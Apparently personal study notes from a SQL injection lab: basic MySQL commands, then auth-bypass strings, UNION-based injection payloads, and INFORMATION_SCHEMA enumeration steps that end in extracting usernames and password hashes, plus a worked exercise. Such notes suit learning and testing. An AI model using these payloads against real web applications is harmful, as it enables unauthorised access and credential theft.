Logging in
`mysql -u root -p pass`
`mysql -u root -h website.htb -P port -p pass`
Adding `--skip-ssl` way help.
### Database Commands
```sql
create database users;

show databases;

use users;
```

### Creating Tables
```sql
create table logins (
	id INT NOT NULL AUTO_INCREMENT,
	username VARCHAR(100) UNIQUE NOT NULL,
	password VARCHAR(100) NOT NULL,
	date_of_joining DATETIME DEFAULT NOW(),
	PRIMARY KEY (id)
);

Describe logins;
```

### Using SQL
```sql
The % is considered a wildcard in this problem.
select * from employees where first_name like 'bar%';
select * from employees where first_name like 'bar%' and hire_date = '1990-01-01';
```

##### Logical Operators_Comments
```sql
select 1 = 1 and 'test' = 'test';
select * from titles where emp_no > 10000 or title != 'engineer';

This will comment out the rest of the commands.
' or id=5) -- -
```

##### URL Encoding
|                    |                                 |
| ------------------ | ------------------------------- |
| `'`                | `%27`                           |
| `"`                | `%22`                           |
| `#`                | `%23`                           |
| `;`                | `%3B`                           |
| `)`                | `%29`                           |
|                    |                                 |
| Auth Bypass        |                                 |
| `admin' or '1'='1` | Basic Auth Bypass               |
| `admin')-- -`      | Basic Auth Bypass With comments |
### Union Commands
```sql
select * from ports UNION select * from ships;
SELECT * from products where product_id = '1' UNION SELECT username, password from passwords-- '

Shows where all the columns are.
SELECT * from products where product_id UNION SELECT username, 2, 3, 4 from passwords-- '


Employees had 6 columns and department had 2.
select * from employees UNION select *, 2, 3, 4,5 from departments;

Another, there were 3 columns and a search bar.
You can also change the @@version to other commans for the database.
cn' UNION select 1,@@version,3,4-- -
```

### Enumeration Commands

| Command              | Meaning                             |
| -------------------- | ----------------------------------- |
| `@@version`          | Version of the Database             |
| `select pow(1,1)`    | For numeric output only.            |
| `select sleep(5)`    | For Blind or no output.             |
| `Information_schema` | Information about all the databases |
|                      |                                     |
Example Below.
`cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -`

Tables
`cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -`

Columns
`cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -`

Data
`cn' UNION select 1, username, password, 4 from dev.credentials-- -`


# Exercise
What is the password hash for 'newuser' stored in the 'users' table in the 'ilfreight' database?
1. `cn' UNION select 1, 2, 3, database()-- -` = ilfreight.
2. `cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='ilfreight'-- -`

3. `cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='users'-- -`
4. `cn' UNION select 1, username, password, 4 from ilfeight.users-- -`